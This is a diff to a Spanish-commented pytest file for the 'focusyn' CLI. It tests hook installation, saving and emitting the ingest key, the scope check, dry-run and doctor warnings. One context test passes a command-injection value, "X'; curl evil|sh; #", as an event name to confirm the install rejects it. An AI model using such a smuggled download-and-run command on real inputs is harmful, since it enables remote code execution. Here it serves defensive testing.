@@ -6,9 +6,15 @@ import json
 from pathlib import Path
 from typing import Any
 
+import httpx
 import pytest
+from typer.testing import CliRunner
 
+from focusyn_cli import config as cfg
 from focusyn_cli import hooks as h
+from focusyn_cli.cli import app
+from focusyn_cli.config import Credential
+from focusyn_cli.http import GatewayClient
 
 _FAKE_BIN = "/home/user/.local/bin/focusyn"
 
@@ -179,3 +185,152 @@ def test_install_rechaza_un_evento_desconocido(claude_dir: Path) -> None:
     with pytest.raises(ValueError, match="desconocido"):
         h.install(events=("SessionEnd", "X'; curl evil|sh; #"))
     assert not (claude_dir / "settings.json").exists()  # no escribió nada
+
+
+# --------------------------------------------------------------------------- #
+# GOTCHA 2: la key ingest del hook — `hooks install` no debe dejar el sync roto en silencio
+# --------------------------------------------------------------------------- #
+
+runner = CliRunner()
+
+
+@pytest.fixture()
+def cli_env(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
+    """settings.json + config.toml aislados; sin FOCUSYN_* del shell contaminando la resolución."""
+    monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(tmp_path / "claude"))
+    monkeypatch.setenv("FOCUSYN_CONFIG", str(tmp_path / "config.toml"))
+    for k in ("FOCUSYN_INGEST_KEY", "FOCUSYN_API_KEY", "FOCUSYN_APPLY_KEY", "FOCUSYN_GATEWAY_URL"):
+        monkeypatch.delenv(k, raising=False)
+    return tmp_path
+
+
+def _seed_login_profile(url: str = "https://gw") -> None:
+    """Simula `focusyn login`: perfil default con JWT (sin api_key) — el caso roto de la F2."""
+    cfg.save_config(
+        cfg.Config(profiles={"default": Credential(gateway_url=url, access_token="jwt.tok")})
+    )
+
+
+def test_cli_install_con_jwt_avisa_que_falta_la_key_ingest(cli_env: Path) -> None:
+    """`login` (JWT) + `hooks install` a secas → los hooks se escriben, pero se AVISA (ruidoso)."""
+    _seed_login_profile()
+    result = runner.invoke(app, ["hooks", "install"])
+    assert result.exit_code == 0, result.stdout
+    assert "hooks instalados" in result.stdout
+    # el aviso va a stderr (no rompe, pero no es callado)
+    assert "scope 'ingest'" in result.stderr
+    assert "--emit-ingest-key" in result.stderr
+
+
+def test_cli_install_ingest_key_lo_guarda_y_no_avisa(cli_env: Path) -> None:
+    _seed_login_profile()
+    result = runner.invoke(app, ["hooks", "install", "--ingest-key", "a2a_ing"])
+    assert result.exit_code == 0, result.stdout
+    assert "key ingest guardada" in result.stdout
+    assert cfg.load_config().ingest_key == "a2a_ing"
+    # con la key guardada el preflight no avisa
+    assert "scope 'ingest'" not in result.stderr
+
+
+def test_cli_install_ingest_key_guion_la_pide_oculta(
+    cli_env: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    _seed_login_profile()
+    monkeypatch.setattr("focusyn_cli.cli.getpass.getpass", lambda _p="": " a2a_pegada ")
+    result = runner.invoke(app, ["hooks", "install", "--ingest-key", "-"])
+    assert result.exit_code == 0, result.stdout
+    assert cfg.load_config().ingest_key == "a2a_pegada"  # con .strip()
+    assert "a2a_pegada" not in result.stdout  # jamás en la salida
+
+
+def _emit_gateway(
+    monkeypatch: pytest.MonkeyPatch, *, scopes: list[str]
+) -> None:
+    """Mockea session.client_for → gateway de mentira (whoami + POST /v1/agents)."""
+    cred = Credential(gateway_url="https://gw", access_token="jwt.tok")
+
+    def handler(request: httpx.Request) -> httpx.Response:
+        if request.url.path == "/v1/auth/whoami":
+            return httpx.Response(200, json={"principal": "user:alice", "scopes": scopes})
+        if request.url.path == "/v1/agents" and request.method == "GET":
+            return httpx.Response(200, json={"agents": []})
+        if request.url.path == "/v1/agents" and request.method == "POST":
+            return httpx.Response(201, json={"agent_id": "memory-host", "api_key": "a2a_ing_nueva"})
+        return httpx.Response(404, json={"error": "no"})
+
+    def _client_for(*_a: object, **_k: object) -> GatewayClient:
+        return GatewayClient(cred, transport=httpx.MockTransport(handler))
+
+    monkeypatch.setattr("focusyn_cli.session.client_for", _client_for)
+
+
+def test_cli_install_emit_ingest_key_emite_y_guarda(
+    cli_env: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    _seed_login_profile()
+    _emit_gateway(monkeypatch, scopes=["read", "ingest"])
+    result = runner.invoke(app, ["hooks", "install", "--emit-ingest-key", "--name", "memory-host"])
+    assert result.exit_code == 0, result.stdout
+    assert "key ingest emitida" in result.stdout
+    assert cfg.load_config().ingest_key == "a2a_ing_nueva"
+    assert "a2a_ing_nueva" not in result.stdout  # jamás en la salida
+    assert "scope 'ingest'" not in result.stderr  # preflight OK
+
+
+def test_cli_install_emit_sin_scope_ingest_falla_claro(
+    cli_env: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """No-escalada: un usuario sin scope 'ingest' no puede auto-emitir la key → error accionable."""
+    _seed_login_profile()
+    _emit_gateway(monkeypatch, scopes=["read", "propose", "apply", "sync"])
+    result = runner.invoke(app, ["hooks", "install", "--emit-ingest-key"])
+    assert result.exit_code == 2
+    assert "no tiene el scope 'ingest'" in result.stderr
+    assert cfg.load_config().ingest_key is None  # no guardó nada
+
+
+def test_cli_install_dry_run_no_toca_config_ni_settings(cli_env: Path) -> None:
+    _seed_login_profile()
+    result = runner.invoke(app, ["hooks", "install", "--ingest-key", "a2a_x", "--dry-run"])
+    assert result.exit_code == 0, result.stdout
+    assert cfg.load_config().ingest_key is None  # no persistió la key
+    assert not (cli_env / "claude" / "settings.json").exists()  # ni los hooks
+
+
+def test_default_ingest_agent_name_prefijo_memory(monkeypatch: pytest.MonkeyPatch) -> None:
+    from focusyn_cli import cli as cli_mod
+
+    monkeypatch.setattr("focusyn_cli.mcp.socket.gethostname", lambda: "Mi-Host")
+    assert cli_mod._default_ingest_agent_name() == "memory-mi-host"
+
+
+def _doctor_stubs(monkeypatch: pytest.MonkeyPatch) -> None:
+    """Neutraliza la red de `doctor` (URL + versión) para aislar el chequeo de hooks."""
+    monkeypatch.setattr("focusyn_cli.cli.check_url", lambda cred, **k: {"api_version": "1"})
+    monkeypatch.setattr("focusyn_cli.cli.version_warning", lambda caps: None)
+
+
+def test_cli_doctor_avisa_si_hooks_sin_ingest_key(
+    cli_env: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    # Perfil sólo-URL (sin secreto) + hooks instalados + sin key ingest → doctor avisa.
+    cfg.save_config(cfg.Config(profiles={"default": Credential(gateway_url="https://gw")}))
+    h.install()
+    _doctor_stubs(monkeypatch)
+    result = runner.invoke(app, ["doctor"])
+    assert result.exit_code == 0, result.output
+    assert "hooks de memory sync" in result.stdout
+    assert "sin API key 'ingest'" in result.stdout
+
+
+def test_cli_doctor_ok_con_ingest_key(cli_env: Path, monkeypatch: pytest.MonkeyPatch) -> None:
+    cfg.save_config(
+        cfg.Config(
+            profiles={"default": Credential(gateway_url="https://gw")}, ingest_key="a2a_ing"
+        )
+    )
+    h.install()
+    _doctor_stubs(monkeypatch)
+    result = runner.invoke(app, ["doctor"])
+    assert result.exit_code == 0, result.output
+    assert "credencial ingest para el hook: presente" in result.stdout
